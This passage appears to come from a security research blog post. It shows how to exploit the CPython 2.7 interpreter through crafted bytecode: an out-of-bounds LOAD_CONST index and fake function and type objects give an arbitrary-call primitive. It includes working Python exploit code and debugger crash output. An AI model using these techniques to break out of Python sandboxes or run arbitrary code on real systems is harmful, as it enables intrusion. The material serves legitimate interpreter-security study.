&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Address of controled data @&lt;/span&gt;&lt;span class="si"&gt;%#.8x&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;address_s&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Offset between const and our object: @&lt;/span&gt;&lt;span class="si"&gt;%#.8x&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Going to push [&lt;/span&gt;&lt;span class="si"&gt;%#.8x&lt;/span&gt;&lt;span class="s1"&gt;] on the virtual stack&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address_consts&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address_s&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;address_consts&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0xC&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0xc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;types&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CodeType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;opmap&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;EXTENDED_ARG&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pshort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;high&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;
  &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;opcode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;opmap&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;LOAD_CONST&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;   &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pshort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;low&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
  &lt;span class="n"&gt;consts&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;..annnnd..&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;D:\&amp;gt;python 1.py
Consts tuple @0x01db1030
Address of controled data @0x022a0654
Offset between const and our object: @0x0013bd86
Going to push [0x022a0654] on the virtual stack

*JIT debugger pops*

eax=01db1030 ebx=00000000 ecx=00000063 edx=00000046 esi=deadbeef edi=0013bd86
eip=1e0ec5fb esp=0027fc68 ebp=01e63fc0 iopl=0         nv up ei ng nz na pe cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
python27!PyEval_EvalFrameEx+0x34b:
1e0ec5fb ff06            inc     dword ptr [esi]      ds:002b:deadbeef=????????
0:000&amp;gt; ub eip l1
python27!PyEval_EvalFrameEx+0x347:
1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch]
0:000&amp;gt; ? eax+edi*4+c
Evaluate expression: 36308564 = 022a0654
0:000&amp;gt; dd 022a0654 l1
022a0654  deadbeef &amp;lt;- the data we control in our PyStringObject
0:000&amp;gt; dps 022a0654-0n20 l2
022a0640  00000003
022a0644  1e226798 python27!PyString_Type
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Perfect, we control a part of the virtual stack :).&lt;/p&gt;
&lt;h2 id="game-over-load_function"&gt;Game over, LOAD_FUNCTION&lt;/h2&gt;
&lt;p&gt;Once you control the virtual stack, the only limit is your imagination and the ability you have to find an interesting spot in the virtual machine. My idea was to use the &lt;em&gt;CALL_FUNCTION&lt;/em&gt; opcode to craft a &lt;em&gt;PyFunctionObject&lt;/em&gt; somehow, push it onto the virtual stack and to use the magic opcode. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;PyObject_HEAD&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="cm"&gt;/* A code object */&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_globals&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="cm"&gt;/* A dictionary (other mappings won&amp;#39;t do) */&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_defaults&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="cm"&gt;/* NULL or a tuple */&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_closure&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="cm"&gt;/* NULL or a tuple of cell objects */&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_doc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;   &lt;span class="cm"&gt;/* The __doc__ attribute, can be anything */&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_name&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="cm"&gt;/* The __name__ attribute, a string object */&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_dict&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="cm"&gt;/* The __dict__ attribute, a dict or NULL */&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_weakreflist&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="cm"&gt;/* List of weak references */&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func_module&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="cm"&gt;/* The __module__ attribute, can be anything */&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;PyFunctionObject&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The thing is, as we saw earlier, the virtual machine usually ensures the type of the object it handles. If the type checking fails, the function bails out and we are not happy, at all. It means we would need an information-leak to obtain a pointer to the PyFunction_Type static variable.&lt;/p&gt;
&lt;p&gt;Fortunately for us, the CALL_FUNCTION can still be abused without knowing that magic pointer to craft correctly our object. Let's go over the source code to illustrate my sayings:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nl"&gt;CALL_FUNCTION&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;PCALL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCALL_ALL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;sp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;stack_pointer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;call_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;oparg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="nf"&gt;call_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="n"&gt;pp_stack&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;oparg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;na&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;oparg&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;nk&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;oparg&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;na&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;nk&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;pfunc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pp_stack&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pfunc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyCFunction_Check&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;nk&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// ..Nope..&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyMethod_Check&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;PyMethod_GET_SELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="c1"&gt;// ..Still Nope...&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyFunction_Check&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
      &lt;span class="c1"&gt;// Nope!&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;
      &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;do_call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pp_stack&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;na&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nk&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="n"&gt;do_call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="n"&gt;pp_stack&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;na&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;nk&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// ...&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyCFunction_Check&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// Nope&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;else&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;PyObject_Call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;callargs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kwdict&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="n"&gt;PyObject_Call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;kw&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;ternaryfunc&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ob_type&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;tp_call&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;PyObject&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="c1"&gt;// Yay an interesting call :)&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kw&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So basically the idea to use &lt;em&gt;CALL_FUNCTION&lt;/em&gt; was a good one, but we will need to craft two different objects:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The first one will be a &lt;em&gt;PyObject&lt;/em&gt; with &lt;em&gt;ob_type&lt;/em&gt; pointing to the second object&lt;/li&gt;
&lt;li&gt;The second object will be a &lt;em&gt;_typeobject&lt;/em&gt; with &lt;em&gt;tp_call&lt;/em&gt; the address you want to call&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This is fairly trivial to do and will give us an absolute-call primitive without crashing the interpreter: s.w.e.e.t.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;opcode&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;types&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;pshort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;H&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;puint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;a&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
  &lt;span class="k"&gt;pass&lt;/span&gt;

&lt;span class="n"&gt;PyStringObject_to_char_array_offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;
&lt;span class="n"&gt;second_object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mh"&gt;0x40&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;puint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;addr_second_object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;second_object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;addr_second_object_controled_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;addr_second_object&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;PyStringObject_to_char_array_offset&lt;/span&gt;

&lt;span class="n"&gt;first_object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;AAAA&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;puint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addr_second_object_controled_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;addr_first_object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;first_object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;addr_first_object_controled_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;addr_first_object&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;PyStringObject_to_char_array_offset&lt;/span&gt;

&lt;span class="n"&gt;consts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;puint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addr_first_object_controled_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;address_s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;PyStringObject_to_char_array_offset&lt;/span&gt;
&lt;span class="n"&gt;address_consts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;consts&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;address_s&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;address_consts&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0xC&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xffffffff&lt;/span&gt;

&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;func_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;types&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CodeType&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
